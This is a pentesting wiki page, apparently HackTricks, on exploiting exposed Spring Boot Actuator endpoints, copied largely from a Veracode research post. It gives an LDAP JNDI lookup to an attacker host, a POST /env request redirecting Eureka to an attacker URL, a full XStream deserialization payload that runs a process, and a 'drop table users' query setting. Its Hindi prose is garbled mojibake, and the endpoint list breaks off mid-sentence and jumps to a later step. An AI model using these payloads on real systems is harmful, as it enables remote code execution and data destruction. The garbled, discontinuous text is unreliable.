# рд╕реНрдкреНрд░рд┐рдВрдЧ рдПрдХреНрдЪреБрдПрдЯрд░реНрд╕

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛** рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**.
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>

## **рд╕реНрдкреНрд░рд┐рдВрдЧ рдСрде рдмрд╛рдИрдкрд╛рд╕**

<figure><img src="../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>

**рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## рд╕реНрдкреНрд░рд┐рдВрдЧ рдмреВрдЯ рдПрдХреНрдЪреБрдПрдЯрд░реНрд╕ рдХрд╛ рд╢реЛрд╖рдг

**рд╕реЗ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЧрдпрд╛** [**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

рд╕реНрдкреНрд░рд┐рдВрдЧ рдмреВрдЯ рдлреНрд░реЗрдорд╡рд░реНрдХ рдореЗрдВ рдПрдХреНрдЪреБрдПрдЯрд░реНрд╕ рдирд╛рдордХ рдХрдИ рдлрд╝реАрдЪрд░реНрд╕ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ рдЖрдкрдХреЗ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЙрддреНрдкрд╛рджрди рдореЗрдВ рдкреБрд╢ рдХрд░рдиреЗ рдкрд░ рдореЙрдирд┐рдЯрд░ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреЗ рд╣реИрдВред рдЗрдиреНрд╣реЗрдВ рд▓реЗрдЦрд╛-рдЬреЛрдЦрд╛, рд╕реНрд╡рд╛рд╕реНрдереНрдп рдФрд░ рдореАрдЯреНрд░рд┐рдХреНрд╕ рдЗрдХрдЯреНрдард╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рд▓реЗрдХрд┐рди рдпреЗ рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рди рд╣реЛрдиреЗ рдкрд░ рдЖрдкрдХреЗ рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рдПрдХ рдЫрд┐рдкреА рджрд░рд╡рд╛рдЬрд╛ рдЦреЛрд▓ рд╕рдХрддреЗ рд╣реИрдВред

рдЬрдм рдПрдХ рд╕реНрдкреНрд░рд┐рдВрдЧ рдмреВрдЯ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЪрд▓ рд░рд╣рд╛ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдХрдИ рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ (рдЬреИрд╕реЗ '/health', '/trace', '/beans', '/env' рдЖрджрд┐) рдХреЛ рд░реВрдЯрд┐рдВрдЧ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдкрдВрдЬреАрдХреГрдд рдХрд░рддрд╛ рд╣реИред рд╕реНрдкреНрд░рд┐рдВрдЧ рдмреВрдЯ 1 - 1.4 рдХреЗ рд▓рд┐рдП, рдпреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдмрд┐рдирд╛ рдкрд╣реБрдВрдЪрдиреЗ рдпреЛрдЧреНрдп рд╣реЛрддреЗ рд╣реИрдВ, рдЬреЛ рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд╕рд╛рде рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рдорд╕реНрдпрд╛рдУрдВ рдХрд╛ рдХрд╛рд░рдг рдмрдирддрд╛ рд╣реИред рд╕реНрдкреНрд░рд┐рдВрдЧ рд╕рдВрд╕реНрдХрд░рдг 1.5 рд╕реЗ рд╢реБрд░реВ рд╣реЛрдХрд░, '/health' рдФрд░ '/info' рдХреЛ рдЫреЛрдбрд╝рдХрд░ рд╕рднреА рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдХреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реЛрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рдЕрдХреНрд╕рд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдбреЗрд╡рд▓рдкрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдЕрдХреНрд╖рдо рдХреА рдЬрд╛рддреА рд╣реИред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдПрдХреНрдЪреБрдПрдЯрд░реНрд╕ рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрдмрдВрдзреА рдкреНрд░рднрд╛рд╡ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рдЦреЛрдЬреЛрдВ рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддрд╛ рд╣реИ:

* /dump - рдереНрд░реЗрдбреНрд╕ рдХрд╛ рдбрдВрдк рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ (рд╕реНрдЯреИрдХ рдЯреНрд░реЗрд╕ рдХреЗ рд╕рд╛рде)
* /trace - рдкрд┐рдЫрд▓реЗ рдХреБрдЫ HTTP рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ (рдЬрд┐рдирдореЗрдВ рд╕рддреНрд░ рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ)
* /logfile - рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ
* /shutdown - рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдмрдВрдж рдХрд░рддрд╛ рд╣реИ
* /mappings - рд╕рднреА MVC рдХрдВрдЯреНрд░реЛрд▓рд░ рдореИрдкрд┐рдВрдЧреНрд╕ рджрд┐рдЦрд╛рддрд╛ рд╣реИ
* /env - рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╡рд╛рддрд╛рд╡рд░рдг рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ
* /actuator/env
* /restart - рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдкреБрдирдГ рдЖрд░рдВрдн рдХрд░рддрд╛ рд╣реИ
* /heapdump - рд╣рдорд╛рд░реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ JVM рд╕реЗ рд╣реАрдк рдбрдВрдк рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ рд▓реМрдЯ
```
<configuration>
<insertFromJNDI env-entry-name="ldap://artsploit.com:1389/jndi" as="appName" />
</configuration>
```
3\. рдЬрдм рдпрд╣ рдлрд╝рд╛рдЗрд▓ рд╡рд┐рдХрд▓рд╛рдВрдЧ рд╕рд░реНрд╡рд░ рдкрд░ рдкрд╛рд░реНрд╕ рд╣реЛрддреА рд╣реИ, рддреЛ рдпрд╣ "env-entry-name" рдкреИрд░рд╛рдореАрдЯрд░ рдорд╛рди рдореЗрдВ рджреБрд╖реНрдкреНрд░рднрд╛рд╡рд┐рдд LDAP рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдПрдХ рдХрдиреЗрдХреНрд╢рди рдмрдирд╛рддрд╛ рд╣реИ, рдЬреЛ JNDI рд╕рдВрдХрд▓рди рдореЗрдВ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИред рджреБрд╖реНрдкреНрд░рднрд╛рд╡рд┐рдд LDAP рд╕рд░реНрд╡рд░ рдПрдХ 'рд╕рдВрджрд░реНрдн' рдкреНрд░рдХрд╛рд░ рдХреЗ рдСрдмреНрдЬреЗрдХреНрдЯ рд╡рд╛рдкрд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд▓рдХреНрд╖рд┐рдд рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрд░ рд╕рдкреНрд▓рд╛рдЗрдб рдмрд╛рдЗрдЯрдХреЛрдб рдХрд╛ **рдЕрднрд┐рдирдп** рдЯреНрд░рд┐рдЧрд░ рдХрд░рддрд╛ рд╣реИред JNDI рд╣рдорд▓реЛрдВ рдХреА рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рд╕рдордЭрд╛рдИ рдЧрдИ рд╣реИ рдЗрд╕ [MicroFocus рд╢реЛрдз рдкреЗрдкрд░](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf) рдореЗрдВред [рдирдИ JNDI рд╢реЛрд╖рдг рддрдХрдиреАрдХ](https://www.veracode.com/blog/research/exploiting-jndi-injections-java) (рд╣рдорд╛рд░реЗ рдмреНрд▓реЙрдЧ рдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ рд╡рд░реНрдгрд┐рдд) рдпрд╣рд╛рдВ рднреА рдХрд╛рдо рдХрд░рддреА рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ Spring Boot Framework рдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕рд░реНрд╡рд░ Tomcat рд╣реИред

**2. '/env' рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕рдВрд╢реЛрдзрди**

рдпрджрд┐ Spring Cloud Libraries рдХреНрд▓рд╛рд╕рдкрде рдореЗрдВ рд╣реИрдВ, рддреЛ **'/env'** рдЕрдВрдд-рдмрд┐рдВрджреБ рдЖрдкрдХреЛ Spring рдкрд░реНрдпрд╛рд╡рд░рдгреАрдп рдЧреБрдгреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред '**@ConfigurationProperties**' рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд┐рд╣реНрдирд┐рдд рд╕рднреА рдмреАрдиреНрд╕ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдФрд░ рдкреБрдирд░реНрдмрд╛рдЗрдВрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╣рдо рдХрдИ, рд▓реЗрдХрд┐рди рд╕рднреА, рдЧреБрдгреЛрдВ рдХреЛ рдХрдВрдЯреНрд░реЛрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ '/configprops' рдПрдХреНрдЯреБрдПрдЯрд░ рдЕрдВрдд-рдмрд┐рдВрджреБ рдкрд░ рд╕реВрдЪреАрдмрджреНрдз рд╣реИрдВред рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ, рдЙрдирдореЗрдВ рдмрд╣реБрдд рд╕рд╛рд░реЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдпрд╣ рд╕реНрдкрд╖реНрдЯ рдирд╣реАрдВ рд╣реИ рдХрд┐ рд╣рдореЗрдВ рдХреНрдпрд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рд╣реИ рддрд╛рдХрд┐ рд╣рдо рдХреБрдЫ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗрдВред рдЗрдирдХреЗ рд╕рд╛рде рдЦреЗрд▓рдиреЗ рдХреЗ рдХреБрдЫ рджрд┐рди рдмрд┐рддрд╛рдиреЗ рдХреЗ рдмрд╛рдж рд╣рдордиреЗ рдпрд╣ рдкрд╛рдпрд╛ рд╣реИ:
```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```
рдпрд╣ рд╕рдВрдкрддреНрддрд┐ Eureka рд╕реЗрд╡рд╛ URL рдХреЛ рдПрдХ рдЕрдирд┐рдпрдорд┐рдд рдорд╛рди рдореЗрдВ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддреА рд╣реИред Eureka рд╕рд░реНрд╡рд░ рд╕рд╛рдорд╛рдиреНрдпрддрдГ рдПрдХ рдЦреЛрдЬ рд╕рд░реНрд╡рд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рд▓рдЧрднрдЧ рд╕рднреА рд╕реНрдкреНрд░рд┐рдВрдЧ рдХреНрд▓рд╛рдЙрдб рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЗрд╕реЗ рдкрдВрдЬреАрдХреГрдд рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рд╕реНрдерд┐рддрд┐ рдЕрджреНрдпрддрди рднреЗрдЬрддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдкрдХреЗ рд▓рдХреНрд╖реНрдп рдореЗрдВ Eureka-Client <1.8.7 рд╣реИ (рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рд╕реНрдкреНрд░рд┐рдВрдЧ рдХреНрд▓рд╛рдЙрдб рдиреЗрдЯрдлреНрд▓рд┐рдХреНрд╕ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИ), рддреЛ рдЖрдк рдЗрд╕рдореЗрдВ рдореМрдЬреВрдж **XStream рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реБрдкрдпреЛрдЧ** рдХрд╛ рд▓рд╛рдн рдЙрдард╛ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдкрдХреЛ рдмрд╕ 'eureka.client.serviceUrl.defaultZone' рд╕рдВрдкрддреНрддрд┐ рдХреЛ рдЕрдкрдиреЗ рд╕рд░реНрд╡рд░ URL ( [http://artsploit.com/n/xstream](http://artsploit.com/n/xstream)) рдкрд░ рд╕реЗрдЯ рдХрд░рдирд╛ рд╣реИ '/env' рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдФрд░ рдлрд┐рд░ '/refresh' рдПрдВрдбрдкреНрд╡рд╛рдЗрдВрдЯ рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рд╣реИред рдЗрд╕рдХреЗ рдмрд╛рдж, рдЖрдкрдХрд╛ рд╕рд░реНрд╡рд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде XStream рдкреЗрд▓реЛрдб рд╕реЗрд╡ рдХрд░реЗрдЧрд╛:
```markup
<linked-hash-set>
<jdk.nashorn.internal.objects.NativeString>
<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
<dataHandler>
<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
<is class="javax.crypto.CipherInputStream">
<cipher class="javax.crypto.NullCipher">
<serviceIterator class="javax.imageio.spi.FilterIterator">
<iter class="javax.imageio.spi.FilterIterator">
<iter class="java.util.Collections$EmptyIterator"/>
<next class="java.lang.ProcessBuilder">
<command>
<string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>
</command>
<redirectErrorStream>false</redirectErrorStream>
</next>
</iter>
<filter class="javax.imageio.ImageIO$ContainsFilter">
<method>
<class>java.lang.ProcessBuilder</class>
<name>start</name>
<parameter-types/>
</method>
<name>foo</name>
</filter>
<next class="string">foo</next>
</serviceIterator>
<lock/>
</cipher>
<input class="java.lang.ProcessBuilder$NullInputStream"/>
<ibuffer></ibuffer>
</is>
</dataSource>
</dataHandler>
</value>
</jdk.nashorn.internal.objects.NativeString>
</linked-hash-set>
```
рдпрд╣ XStream рдкреЗрд▓реЛрдб Marshalsec рд░рд┐рд╕рд░реНрдЪ рдХреЗ [рдЗрдореЗрдЬIO JDK-рдХреЗрд╡рд▓ рдЧреИрдЬреЗрдЯ рдЪреЗрди](https://github.com/mbechler/marshalsec) рдХреЗ рдереЛрдбрд╝реЗ рдмрджрд▓реЗ рд╣реБрдП рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рд╣реИред рдпрд╣рд╛рдВ рдПрдХрдорд╛рддреНрд░ рдЕрдВрддрд░ рд╣реИ рдХрд┐ рдпрд╣рд╛рдВ 'jdk.nashorn.internal.objects.NativeString.hashCode()' рдореЗрдердб рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **LinkedHashSet** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдореВрд▓ рдкреЗрд▓реЛрдб рдЗрд╕реА рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП java.lang.Map рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди Eureka рдХреЗ XStream рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ [рдорд╛рдирдЪрд┐рддреНрд░реЛрдВ рдХреЗ рд▓рд┐рдП рдХрд╕реНрдЯрдо рдХрдирд╡рд░реНрдЯрд░](https://github.com/Netflix/eureka/blob/master/eureka-client/src/main/java/com/netflix/discovery/converters/XmlXStream.java#L58) рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдХреЗ рдХрд╛рд░рдг рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрд╕рдВрднрд╡ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред рдКрдкрд░ рджрд┐рдП рдЧрдП рдкреЗрд▓реЛрдб рдореЗрдВ рдХрд┐рд╕реА рднреА рдорд╛рдирдЪрд┐рддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдЕрддрд┐рд░рд┐рдХреНрдд рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЗ рдмрд┐рдирд╛ рд░рд┐рдореЛрдЯ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

Spring Actuators рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдЖрдк рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЗрд╕ рдХрдордЬреЛрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЪрд╛рд╣реЗ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЖрдВрддрд░рд┐рдХ Eureka рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛ рдпрд╛ рди рд╣реЛ; рдЖрдкрдХреЛ рдХреЗрд╡рд▓ рдПрдХ "/env" рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреА рдЙрдкрд▓рдмреНрдзрддрд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

**рдЕрдиреНрдп рдЙрдкрдпреЛрдЧреА рд╕реЗрдЯрд┐рдВрдЧреНрд╕:**

**spring.datasource.tomcat.validationQuery=drop+table+users** - рдЖрдк рдХрд┐рд╕реА рднреА SQL рдХреНрд╡реЗрд░реА рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдпрд╣ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдореМрдЬреВрджрд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рдЦрд┐рд▓рд╛рдл рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рдореЗрдВ insert, update рдпрд╛ delete рдЬреИрд╕реЗ рдХрд┐рд╕реА рднреА рд╡рдХреНрддрд╡реНрдп рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

![Exploiting Spring Boot Actuators Drop Table](https://www.veracode.com/sites/default/files/exploiting\_spring\_boot\_actuators\_drop\_table.png)

**spring.datasource.tomcat.url**=jdbc:hsqldb:[https://localhost:3002/xdb](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators) - рдЖрдкрдХреЛ рдореМрдЬреВрджрд╛ JDBC рдХрдиреЗрдХреНрд╢рди рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

рдЖрдЦрд┐рд░реА рд╡рд╛рд▓рд╛ рдмрд╣реБрдд рдЕрдЪреНрдЫрд╛ рджрд┐рдЦрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЬрдм рдбреЗрдЯрд╛рдмреЗрд╕ рдХрдиреЗрдХреНрд╢рди рдЪрд▓ рд░рд╣рд╛ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдХреЗрд╡рд▓ JDBC рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдЕрджреНрдпрддрд┐рдд рдХрд░рдиреЗ рд╕реЗ рдХреЛрдИ рдкреНрд░рднрд╛рд╡ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред рдзрдиреНрдпрд╡рд╛рдж, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╣рдореЗрдВ рдПрдХ рдФрд░ рдкреНрд░реЙрдкрд░реНрдЯреА рдорд┐рд▓ рд╕рдХрддреА рд╣реИ рдЬреЛ рд╣рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддреА рд╣реИ:

**spring.datasource.tomcat.max-active**=777

рд╣рдо рдпрд╣рд╛рдВ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╣ рдЪрд╛рд▓ рд╣реИ рдХрд┐ рд╣рдо рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рд╕рд╛рде рд╕рдордп-рд╕рдордп рдкрд░ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рд╣рдо JDBC рдХрдиреЗрдХреНрд╢рди рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЗрд╕рдХреЗ рдмрд╛рдж рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рднрд╛рд░реА рд▓реЛрдб рдХреА рднрд╛рдВрддрд┐ рдмрд╣реБрдд рд╕рд╛рд░реЗ рдЕрдиреБрд░реЛрдз рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред рднрд╛рд░реА рд▓реЛрдб рдХреЗ рддрд╣рдд, рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдирд╡реАрдирддрдо рджреБрд╖реНрдкреНрд░рднрд╛рд╡рд┐рдд JDBC рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рд╕рд╛рде рдПрдХ рдирдпрд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рдХрдиреЗрдХреНрд╢рди рдмрдирд╛рдПрдЧрд╛ред рдореИрдВрдиреЗ Mysql рдкрд░ рдпрд╣ рддрдХрдиреАрдХ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдкрд░реАрдХреНрд╖рдг рдХрд┐рдпрд╛ рд╣реИ рдФрд░ рдпрд╣ рдмрд╣реБрдд рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред

![Exploiting Spring Boot Actuators Max Active](https://www.veracode.com/sites/default/files/exploiting\_spring\_boot\_actuators\_max\_active.png)

